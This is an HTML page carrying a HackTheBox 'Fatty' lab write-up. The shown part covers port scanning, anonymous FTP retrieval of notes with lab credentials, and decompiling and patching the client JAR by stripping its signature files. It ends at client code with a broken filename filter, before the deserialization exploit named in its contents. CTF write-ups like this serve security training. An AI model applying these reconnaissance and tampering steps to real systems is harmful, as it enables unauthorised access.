<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Fatty | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,insane"><meta name=description content="Fatty HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/fatty/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/fatty/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Fatty "><meta property="og:description" content="Fatty HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/fatty/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/fatty/fatty.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-08-08T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/fatty/fatty.png"><meta name=twitter:title content="Fatty "><meta name=twitter:description content="Fatty HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Fatty ","item":"https://s4ch.github.io/writeups/hackthebox/fatty/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Fatty ","name":"Fatty ","description":"Fatty HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","insane"],"articleBody":"Information Name: Fatty Profile: www.hackthebox.eu Difficulty: Insane OS: Linux Points: 50 Overview TL;DR: Java code review, bytecode JAR modification; exploit deserialization.\nInstall tools used in this WU on BlackArch Linux:\npacman -S nmap filezilla jd-gui recaf Network enumeration # Nmap 7.80 scan initiated Mon Jul 20 19:58:26 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.174 Nmap scan report for 10.10.10.174 Host is up (0.022s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 ftp ftp 15426727 Oct 30 2019 fatty-client.jar | -rw-r--r-- 1 ftp ftp 526 Oct 30 2019 note.txt | -rw-r--r-- 1 ftp ftp 426 Oct 30 2019 note2.txt |_-rw-r--r-- 1 ftp ftp 194 Oct 30 2019 note3.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.15.33 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA) |_ 256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519) 1337/tcp open ssl/waste? ... | ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2019-09-11T15:42:00 | Not valid after: 2020-09-10T15:42:00 | MD5: 3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e |_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1 |_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time. 1338/tcp open ssl/wmc-log-svc? ... | ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2019-09-11T15:42:00 | Not valid after: 2020-09-10T15:42:00 | MD5: 3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e |_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1 |_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time. 1339/tcp open ssl/kjtsiteserver? ... | ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2019-09-11T15:42:00 | Not valid after: 2020-09-10T15:42:00 | MD5: 3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e |_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1 |_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time. ... Host script results: |_clock-skew: mean: 5m07s, deviation: 0s, median: 5m07s Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 20 20:00:04 2020 -- 1 IP address (1 host up) scanned in 97.47 seconds FTP With FileZilla we can retrieve the files available on the anonymously accessible FTP server.\n| -rw-r--r-- 1 ftp ftp 15426727 Oct 30 2019 fatty-client.jar | -rw-r--r-- 1 ftp ftp 526 Oct 30 2019 note.txt | -rw-r--r-- 1 ftp ftp 426 Oct 30 2019 note2.txt |_-rw-r--r-- 1 ftp ftp 194 Oct 30 2019 note3.txt note.txt\nDear members, because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337. Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice if you use different servers from day to day to balance the server load. We were too lazy to fix the default port in the '.jar' file, but since you are all senior java developers you should be capable of doing it yourself ;) Best regards, qtc So we will need to decompile the jar, change the port and recompile it.\nnote2.txt\nDear members, we are currently experimenting with new java layouts. The new client uses a static layout. If your are using a tiling window manager or only have a limited screen size, try to resize the client window until you see the login from. Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11 per default, you may need to install it manually. Best regards, qtc We may need to use Java 8, I have one if needed:\n$ archlinux-java status Available Java environments: java-10-openjdk java-14-openjdk (default) java-8-openjdk note3.txt\nDear members, We had to remove all other user accounts because of some seucrity issues. Until we have fixed these issues, you can use my account: User: qtc Pass: clarabibi Best regards, qtc We will be able to use those creds.\nJava decompiling Let’s open fatty-client.jar in jd-gui.\nIn the beans.xml config file, we can retrieve the server connection information, a keystore, and a secret.\n\u003c?xml version = \"1.0\" encoding = \"UTF-8\"?\u003e ","wordCount":"5177","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/fatty/fatty.png","datePublished":"2020-08-08T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/fatty/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Fatty</h1><div class=post-description>Fatty HackTheBox writeup</div><div class=post-meta><span title='2020-08-08 00:00:00 +0000 UTC'>August 8, 2020</span>&nbsp;·&nbsp;25 min&nbsp;·&nbsp;5177 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/fatty/fatty.png alt="Fatty HackTheBox Machine"><p>Fatty - Insane Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#ftp>FTP</a></li><li><a href=#java-decompiling>Java decompiling</a></li><li><a href=#client-discovery>Client discovery</a></li><li><a href=#code-analysis-fatty-client>Code analysis: fatty client</a></li><li><a href=#code-analysis-fatty-server>Code analysis: fatty server</a></li><li><a href=#java-object-deserialization-exploit>Java object deserialization exploit</a></li><li><a href=#system-reconnaissance>System reconnaissance</a></li><li><a href=#privilege-escalation-of-machine>Privilege Escalation of Machine</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Fatty</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/227>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Insane</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 50</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p><strong>TL;DR</strong>: Java code review, bytecode JAR modification; exploit deserialization.</p><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>pacman -S nmap filezilla jd-gui recaf
</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><pre tabindex=0><code># Nmap 7.80 scan initiated Mon Jul 20 19:58:26 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.174
Nmap scan report for 10.10.10.174
Host is up (0.022s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar
| -rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt
| -rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt
|_-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.15.33
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA)
|_  256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519)
1337/tcp open  ssl/waste?
...
| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-11T15:42:00
| Not valid after:  2020-09-10T15:42:00
| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e
|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1
|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.
1338/tcp open  ssl/wmc-log-svc?
...
| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-11T15:42:00
| Not valid after:  2020-09-10T15:42:00
| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e
|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1
|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.
1339/tcp open  ssl/kjtsiteserver?
...
| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-11T15:42:00
| Not valid after:  2020-09-10T15:42:00
| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e
|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1
|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.
...
Host script results:
|_clock-skew: mean: 5m07s, deviation: 0s, median: 5m07s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 20 20:00:04 2020 -- 1 IP address (1 host up) scanned in 97.47 seconds
</code></pre><h2 id=ftp>FTP<a hidden class=anchor aria-hidden=true href=#ftp>#</a></h2><p>With <code>FileZilla</code> we can retrieve the files available on the anonymously
accessible FTP server.</p><pre tabindex=0><code>| -rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar
| -rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt
| -rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt
|_-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt
</code></pre><p><code>note.txt</code></p><pre tabindex=0><code>Dear members,

because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337.
Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice
if you use different servers from day to day to balance the server load.

We were too lazy to fix the default port in the &#39;.jar&#39; file, but since you are all senior java developers you should be capable of
doing it yourself ;)

Best regards,
qtc
</code></pre><p>So we will need to decompile the jar, change the port and recompile it.</p><p><code>note2.txt</code></p><pre tabindex=0><code>Dear members,

we are currently experimenting with new java layouts. The new client uses a static layout. If your
are using a tiling window manager or only have a limited screen size, try to resize the client window
until you see the login from.

Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11
per default, you may need to install it manually.

Best regards,
qtc
</code></pre><p>We may need to use Java 8, I have one if needed:</p><pre tabindex=0><code>$ archlinux-java status
Available Java environments:
  java-10-openjdk
  java-14-openjdk (default)
  java-8-openjdk
</code></pre><p><code>note3.txt</code></p><pre tabindex=0><code>Dear members,

We had to remove all other user accounts because of some seucrity issues.
Until we have fixed these issues, you can use my account:

User: qtc
Pass: clarabibi

Best regards,
qtc
</code></pre><p>We will be able to use those creds.</p><h2 id=java-decompiling>Java decompiling<a hidden class=anchor aria-hidden=true href=#java-decompiling>#</a></h2><p>Let&rsquo;s open <code>fatty-client.jar</code> in <a href=https://java-decompiler.github.io/>jd-gui</a>.</p><p>In the <code>beans.xml</code> config file, we can retrieve the server connection
information, a keystore, and a secret.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version = &#34;1.0&#34; encoding = &#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;beans</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://www.springframework.org/schema/beans&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>xmlns:xsi=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>xsi:schemaLocation=</span><span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                http://www.springframework.org/schema/beans
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                spring-beans-3.0.xsd&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the
</span></span></span><span style=display:flex><span><span style=color:#75715e>	 constructor function. --&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;bean</span> <span style=color:#a6e22e>id=</span><span style=color:#e6db74>&#34;connectionContext&#34;</span> <span style=color:#a6e22e>class =</span> <span style=color:#e6db74>&#34;htb.fatty.shared.connection.ConnectionContext&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;constructor-arg</span> <span style=color:#a6e22e>index=</span><span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>value =</span> <span style=color:#e6db74>&#34;server.fatty.htb&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;constructor-arg</span> <span style=color:#a6e22e>index=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>value =</span> <span style=color:#e6db74>&#34;8000&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;/bean&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an default
</span></span></span><span style=display:flex><span><span style=color:#75715e>constructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;bean</span> <span style=color:#a6e22e>id=</span><span style=color:#e6db74>&#34;trustedFatty&#34;</span> <span style=color:#a6e22e>class =</span> <span style=color:#e6db74>&#34;htb.fatty.shared.connection.TrustedFatty&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;property</span> <span style=color:#a6e22e>name =</span> <span style=color:#e6db74>&#34;keystorePath&#34;</span> <span style=color:#a6e22e>value =</span> <span style=color:#e6db74>&#34;fatty.p12&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;/bean&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;bean</span> <span style=color:#a6e22e>id=</span><span style=color:#e6db74>&#34;secretHolder&#34;</span> <span style=color:#a6e22e>class =</span> <span style=color:#e6db74>&#34;htb.fatty.shared.connection.SecretHolder&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;property</span> <span style=color:#a6e22e>name =</span> <span style=color:#e6db74>&#34;secret&#34;</span> <span style=color:#a6e22e>value =</span> <span style=color:#e6db74>&#34;clarabibiclarabibiclarabibi&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;/bean&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val --&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;bean</span> <span style=color:#a6e22e>id=</span><span style=color:#e6db74>&#34;connection&#34;</span> <span style=color:#a6e22e>class =</span> <span style=color:#e6db74>&#34;htb.fatty.client.connection.Connection&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;constructor-arg</span> <span style=color:#a6e22e>index =</span> <span style=color:#e6db74>&#34;0&#34;</span> <span style=color:#a6e22e>ref =</span> <span style=color:#e6db74>&#34;connectionContext&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;constructor-arg</span> <span style=color:#a6e22e>index =</span> <span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>ref =</span> <span style=color:#e6db74>&#34;trustedFatty&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>&lt;constructor-arg</span> <span style=color:#a6e22e>index =</span> <span style=color:#e6db74>&#34;2&#34;</span> <span style=color:#a6e22e>ref =</span> <span style=color:#e6db74>&#34;secretHolder&#34;</span><span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>   <span style=color:#f92672>&lt;/bean&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/beans&gt;</span>
</span></span></code></pre></div><p>Let&rsquo;s change the port value form <code>8080</code> to <code>1337</code> in <code>beans.xml</code> and then
update the jar archive. We also remove the files used for signature so Java
doesn&rsquo;t complain <code>beans.xml</code> doesn&rsquo;t match the signature anymore.</p><pre tabindex=0><code>$ jar -uf fatty-client-patched.jar beans.xml
$ zip -d fatty-client-patched.jar META-INF/1.RSA META-INF/1.SF
deleting: META-INF/1.SF
deleting: META-INF/1.RSA
</code></pre><p>Then we can run our patched version <code>java -jar fatty-client-patched.jar</code>.</p><p>But before, we need to add the local domain in our hosts file and to set Java 8.</p><pre tabindex=0><code>$ cat /etc/hosts | grep fatty
10.10.10.174 server.fatty.htb

$ archlinux-java set java-8-openjdk
</code></pre><p>Now we can log in and discover the fat client from a user point of view.</p><h2 id=client-discovery>Client discovery<a hidden class=anchor aria-hidden=true href=#client-discovery>#</a></h2><ul><li>Profile<ul><li>Whoami: Γ£à</li><li>ChangePassword: Γ¥î</li></ul></li><li>ServerStatus<ul><li>Uname: Γ¥î</li><li>Users: Γ¥î</li><li>Netstat: Γ¥î</li><li>Ipconfig: Γ¥î</li></ul></li><li>FileBrowser: seems like a <code>ls</code> on a hardcoded folder<ul><li>Configs: Γ£à</li><li>Notes: Γ£à</li><li>Mail: Γ£à</li></ul></li><li>ConnectionTest:<ul><li>Ping: Γ£à</li></ul></li><li>Help<ul><li>Contact: Γ£à</li><li>About: Γ£à</li></ul></li></ul><p>There is also an <code>Open</code> feature that read a file (seems to exclude comments),
it seems it&rsquo;s not possible to do directory traversal but we can <code>cd</code> in the
FileBrowser files and read them.</p><p><code>security.txt</code></p><pre tabindex=0><code>Since our fatty clients processes sensitive data, we were forced to perform a penetration test on it.
I had no time to look at the results yet in more detail, but it looks like there are a few criticals.
We should starting to fix these issues ASAP.
</code></pre><p><code>dave.txt</code></p><pre tabindex=0><code>Hey qtc,

until the issues from the current pentest are fixed we have removed all administrative users from the database.
Your user account is the only one that is left. Since you have only user permissions, this should prevent exploitation
of the other issues. Furthermore, we implemented a timeout on the login procedure. Time heavy SQL injection attacks are
therefore no longer possible.

Best regards,
Dave
</code></pre><h2 id=code-analysis-fatty-client>Code analysis: fatty client<a hidden class=anchor aria-hidden=true href=#code-analysis-fatty-client>#</a></h2><p>With <a href=https://java-decompiler.github.io/>JD-GUI</a> or other decompiler we can decompile the code to read it.
With <code>jar -uf</code> we can easily update a text file like <code>beans.xml</code> but we can&rsquo;t
update code in the JAR because the code is compiled (<code>.class</code>).
Trying to compile our <code>.java</code> won&rsquo;t probably do any good as there are not
the original code but ones obtained through decompilation.
So the best idea is to update the original JAR via a Java bytecode editor.</p><p>I used <a href=https://github.com/Col-E/Recaf>Recaf</a> for that.</p><p><code>htb/fatty/client/gui/ClientGuiTest.java</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>        openFileButton.<span style=color:#a6e22e>addActionListener</span>(<span style=color:#66d9ef>new</span> ActionListener(){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>actionPerformed</span>(ActionEvent e) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>currentFolder</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>                    JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;No folder selected! List a directory first!&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                String response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>                String fileName <span style=color:#f92672>=</span> ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>fileTextField</span>.<span style=color:#a6e22e>getText</span>();
</span></span><span style=display:flex><span>                fileName.<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>&#34;[^a-zA-Z0-9.]&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                    response <span style=color:#f92672>=</span> ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>invoker</span>.<span style=color:#a6e22e>open</span>(ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>currentFolder</span>, fileName);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>catch</span> (MessageBuildException <span style=color:#f92672>|</span> MessageParseException e1) {
</span></span><span style=display:flex><span>                    JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;Failure during message building/parsing.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>catch</span> (IOException e2) {
</span></span><span style=display:flex><span>                    JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                textPane.<span style=color:#a6e22e>setText</span>(response);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        });
